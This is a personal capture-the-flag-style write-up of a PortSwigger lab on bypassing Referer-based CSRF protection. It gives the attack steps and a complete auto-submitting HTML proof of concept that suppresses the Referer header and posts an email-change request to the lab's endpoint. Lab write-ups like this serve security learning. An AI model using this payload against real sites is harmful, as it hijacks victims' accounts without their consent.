# [CSRF where Referer validation depends on header being present] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-11
 
---
 
## Vulnerability / core concept
Cross-site Request Forgery

## What made me stuck
This level was pretty easy and straightforward. I solved it pretty quickly.
 
## What unblocked me
`null`
 
---


## Attack path
1) First we need to log in into our account to access email change functionality.
2) We can see that there is no csrf token that protects from csrf attacks.
3) When I tried to generate csrf PoC using caido, i tested it, however, it did not work and gave me `Invalid Referer header`.
4) Doing some research, i found out that it is possible to remove referer header bu using meta element in HTML.
5) Adding it to our csrf PoC helped us to bypass referer based csrf protection and complete csrf attack against victim.

---


## Payload / key command
```html
<!DOCTYPE html>
<html>
<head>
    <title>CSRF PoC</title>
    <meta name="referrer" content="no-referrer">
</head>
<body>
    <h3>Standard CSRF PoC</h3>
    <form action="https://0a7e00dc0411c704817211de00c50016.web-security-academy.net/my-account/change-email"
          method="post"
          referrerpolicy="no-referrer">
        <input type="hidden" name="email" value="babek@victim" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
    </script>
</body>
</html>
```
This is standart csrf PoC payload with additional `<meta name="referrer" content="no-referrer">` that removes referer header for csrf protection.

---


## What I'd recognize faster next time
If during pentesting you notice that some protection is tied to referer header, there is a high chance that it is exploitable because it is not a good security against attacks.
 

